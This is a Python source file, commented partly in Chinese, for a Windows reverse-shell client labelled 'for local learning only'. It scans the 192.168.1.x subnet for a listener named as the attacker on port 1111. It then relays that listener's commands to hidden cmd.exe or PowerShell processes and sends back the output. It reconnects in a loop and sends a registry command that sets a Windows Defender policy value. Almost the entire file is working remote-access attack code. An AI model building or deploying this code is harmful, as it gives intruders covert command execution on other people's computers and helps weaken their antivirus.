
import socket
import subprocess
import os
import sys
import time
import threading
import re
import argparse
import queue

# For local learning only
DEFAULT_PORT = 1111
ATTACKER_IP = "192.168.1.147"  # 字符串类型，存储IP
ATTACKER_PORT = DEFAULT_PORT

CREATE_NO_WINDOW = 0x08000000
DETACHED_PROCESS = 0x00000008


def monitor_connection(s, current_shell):
    """Monitor connection and kill shell if disconnected"""
    while True:
        try:
            s.send(b"")
            time.sleep(1)
        except:
            if current_shell and current_shell.poll() is None:
                try:
                    current_shell.kill()
                except:
                    pass
            break


def parse_timeout_cmd(cmd_str):
    """解析超时参数"""
    pattern = r'^(cmd|powershell)\s+-t\s+(\d+)$'
    match = re.match(pattern, cmd_str.strip().lower())
    if match:
        return match.group(1), int(match.group(2))
    return cmd_str.strip().lower(), 5


def get_local_ip():
    """保留函数，测试用"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        for addr in socket.getaddrinfo(socket.gethostname(), None):
            ip = addr[4][0]
            if not ip.startswith("127.") and "." in ip:
                return ip
    return None


def scan_192_168_1_network(target_port):
    """返回IP+持久连接的socket，不关闭"""
    target_ips = []
    for i in range(1, 255):
        ip = f"192.168.1.{i}"
        target_ips.append(ip)

    ip_queue = queue.Queue()
    for ip in target_ips:
        ip_queue.put(ip)

    found_result = {"ip": None, "socket": None}
    lock = threading.Lock()

    def connect_worker():
        nonlocal found_result
        while not ip_queue.empty() and found_result["ip"] is None:
            ip = ip_queue.get()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)  # 延长超时到3秒
                s.connect((ip, target_port))
                # 连接成功：保存IP和socket，不关闭！
                with lock:
                    found_result["ip"] = ip
                    found_result["socket"] = s
                break
            except:
                ip_queue.task_done()
                continue

    threads = []
    for _ in range(10):
        t = threading.Thread(target=connect_worker)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    return found_result


def main():
    global ATTACKER_PORT, ATTACKER_IP
    current_shell = None
    shell_type = ""
    shell_timeout = 5
    current_prompt = b">"

    # 注释隐藏窗口，便于调试
    # if sys.platform == "win32":
    #     import ctypes
    #     try:
    #         ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    #     except:
    #         pass

    while True:
        s = None
        monitor_thread = None
        try:
            # 扫描网段，获取IP+socket
            found_result = scan_192_168_1_network(ATTACKER_PORT)
            # ========== 修复点1：提取字典中的IP和socket，而非直接赋值 ==========
            if found_result["ip"] and found_result["socket"]:
                ATTACKER_IP = found_result["ip"]  # 提取字符串IP
                s = found_result["socket"]  # 提取socket对象
                # ========== 修复点2：打印字符串IP，而非整个字典 ==========
                print(f"[+] Found attacker IP: {ATTACKER_IP}, connection alive")
            else:
                print("[!] No attacker found, retry after 5s")
                time.sleep(5)
                continue

            # 重置变量
            current_prompt = b">"
            current_shell = None
            shell_type = ""
            shell_timeout = 5

            # 移除原有的socket创建/连接代码（关键！）
            s.settimeout(None)
            s.send(b"[+] Connection successful!\n")
            s.send(b"Usage:\n")
            s.send(b"  cmd           - Enter CMD Shell (timeout=5s)\n")
            s.send(b"  cmd -t <num>  - Enter CMD Shell with custom timeout\n")
            s.send(b"  powershell    - Enter PowerShell Shell (timeout=5s)\n")
            s.send(b"  powershell -t <num> - Enter PowerShell with custom timeout\n")
            s.send(b"  exit_shell    - Exit current Shell\n")
            s.send(b"  exit          - Disconnect\n")
            command_str = '\n' + r'Please run "reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 0 /f" first' + '\n'
            s.send(command_str.encode('utf-8'))
            s.send(current_prompt)

            monitor_thread = threading.Thread(target=monitor_connection, args=(s, current_shell))
            monitor_thread.daemon = True
            monitor_thread.start()

            while True:
                try:
                    cmd_bytes = s.recv(4096)
                    if not cmd_bytes:
                        break
                    cmd = cmd_bytes.decode("gbk", errors="ignore").strip()

                    base_cmd, custom_timeout = parse_timeout_cmd(cmd)
                    if base_cmd in ["cmd", "powershell"] and not (current_shell and current_shell.poll() is None):
                        shell_timeout = custom_timeout

                    if current_shell and current_shell.poll() is None:
                        if base_cmd in ["cmd", "powershell"]:
                            prompt_msg = f"[!] Already running {shell_type.upper()} Shell! Use 'exit_shell' first\n".encode(
                                "gbk") + current_prompt
                            s.send(prompt_msg)
                            continue

                    if base_cmd == "exit":
                        s.send(b"[+] Disconnecting...\n")
                        if current_shell:
                            current_shell.kill()
                            current_shell = None
                        s.close()
                        break

                    if base_cmd == "exit_shell":
                        if current_shell:
                            current_shell.kill()
                            current_shell = None
                            shell_type = ""
                            current_prompt = b">"
                            shell_timeout = 5
                            s.send(b"[+] Shell exited\n")
                            s.send(current_prompt)
                        else:
                            s.send(b"[!] No running Shell\n")
                            s.send(current_prompt)
                        continue

                    if not cmd:
                        s.send(current_prompt)
                        continue

                    if base_cmd == "cmd" and not current_shell:
                        try:
                            cmd_path = os.path.join(os.environ.get("SYSTEMROOT", "C:\\Windows"), "System32", "cmd.exe")
                            current_shell = subprocess.Popen(
                                [cmd_path, "/k"],
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT,
                                creationflags=CREATE_NO_WINDOW,
                                bufsize=1,
                                shell=False,
                                close_fds=False
                            )
                            shell_type = "cmd"
                            s.send(f"[+] Entered CMD Shell (timeout={shell_timeout}s)\n".encode("gbk"))

                            prompt = b""
                            start_time = time.time()
                            while b">" not in prompt and len(prompt) < 200 and (time.time() - start_time) < 2:
                                chunk = current_shell.stdout.read(1)
                                if chunk:
                                    prompt += chunk
                                else:
                                    time.sleep(0.01)
                            if prompt and not prompt.endswith(b">"):
                                prompt += b">"
                            current_prompt = prompt if prompt else b"D:\\>"
                            s.send(current_prompt)
                        except Exception as e:
                            s.send(f"[!] Failed to start CMD: {str(e)}\n".encode("gbk"))
                            s.send(current_prompt)
                        continue

                    if base_cmd == "powershell" and not current_shell:
                        try:
                            ps_path = os.path.join(os.environ.get("SYSTEMROOT", "C:\\Windows"), "System32",
                                                   "WindowsPowerShell", "v1.0", "powershell.exe")
                            auto_exec_cmds = (
                                "function global:default { throw \"该命令缺少参数\" }; "
                                "$PSDefaultParameterValues = @{'*:Path'={default}}"
                            )
                            current_shell = subprocess.Popen(
                                [ps_path, "-NoLogo", "-NoExit", "-Command", auto_exec_cmds],
                                stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT,
                                creationflags=CREATE_NO_WINDOW,
                                bufsize=1,
                                shell=False,
                                close_fds=False
                            )
                            shell_type = "ps"
                            s.send(f"[+] Entered PowerShell Shell (timeout={shell_timeout}s)\n".encode("gbk"))

                            prompt = b""
                            start_time = time.time()
                            while b">" not in prompt and len(prompt) < 200 and (time.time() - start_time) < 2:
                                chunk = current_shell.stdout.read(1)
                                if chunk:
                                    prompt += chunk
                                else:
                                    time.sleep(0.01)
                            if prompt and not prompt.endswith(b">"):
                                prompt += b"PS >"
                            current_prompt = prompt if prompt else b"PS >"
                            s.send(current_prompt)
                        except Exception as e:
                            s.send(f"[!] Failed to start PowerShell: {str(e)}\n".encode("gbk"))
                            s.send(current_prompt)
                        continue

                    if current_shell and current_shell.poll() is None:
                        try:
                            exec_cmd = cmd
                            if shell_type == "cmd":
                                if exec_cmd.strip().lower() == "dir":
                                    exec_cmd = "dir /w"
                            elif shell_type == "ps":
                                if exec_cmd.strip() and not exec_cmd.strip().endswith("| | Write-Host"):
                                    exec_cmd = f"{exec_cmd} | Write-Host"

                            send_data = (exec_cmd + "\r\n").encode("gbk")
                            current_shell.stdin.write(send_data)
                            current_shell.stdin.flush()

                            output = b""
                            start_time = time.time()
                            current_used_timeout = shell_timeout
                            while (time.time() - start_time) < current_used_timeout:
                                chunk = current_shell.stdout.read(1)
                                if chunk:
                                    output += chunk
                                    if (shell_type == "cmd" and output.endswith(b">")) or \
                                            (shell_type == "ps" and output.endswith(b"PS >")) or \
                                            output.endswith(b"> "):
                                        current_prompt = output[-output[::-1].find(b">"):]
                                        break
                                else:
                                    time.sleep(0.01)

                            timeout_occurred = False
                            if (time.time() - start_time) >= current_used_timeout and current_shell.poll() is None:
                                current_shell.kill()
                                current_shell = None
                                shell_type = ""
                                current_prompt = b">"
                                shell_timeout = 5
                                timeout_occurred = True
                                s.send(
                                    f"[!] Command terminated: Execution time exceeded {current_used_timeout} seconds\n".encode(
                                        "gbk"))
                                s.send(current_prompt)
                                continue

                            if output:
                                s.send(output)
                                if not output.endswith(b">"):
                                    s.send(current_prompt)
                            else:
                                s.send(b"[+] Command executed (no output)\n")
                                s.send(current_prompt)
                        except Exception as e:
                            s.send(f"[!] Command error: {str(e)}\n".encode("gbk"))
                            s.send(current_prompt)
                            current_shell.kill()
                            current_shell = None
                            shell_type = ""
                            current_prompt = b">"
                            shell_timeout = 5
                    else:
                        if base_cmd not in ["cmd", "powershell"] and cmd.strip() != "":
                            s.send(b"[!] Please enter 'cmd' or 'powershell' first\n")
                            s.send(current_prompt)

                except socket.timeout:
                    s.send(current_prompt)
                    continue
                except Exception as e:
                    s.send(f"[!] Connection error: {str(e)}\n".encode("gbk"))
                    s.send(current_prompt)
                    if current_shell:
                        current_shell.kill()
                        current_shell = None
                        shell_type = ""
                        current_prompt = b">"
                        shell_timeout = 5

        except TimeoutError:
            print(f"[!] Connection timeout to {ATTACKER_IP}:{ATTACKER_PORT}")
        except Exception as e:
            print(f"[!] Connection failed: {str(e)}")
        finally:
            if current_shell:
                try:
                    current_shell.kill()
                except:
                    pass
                current_shell = None
            if s:
                try:
                    s.close()
                except:
                    pass
            if monitor_thread:
                try:
                    monitor_thread.join(1)
                except:
                    pass

        time.sleep(5)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Core Client (support custom port)')
    parser.add_argument('-p', '--port', type=int, default=DEFAULT_PORT,
                        help=f'Connection port (default: {DEFAULT_PORT})')

    args = parser.parse_args()
    ATTACKER_PORT = args.port

    main()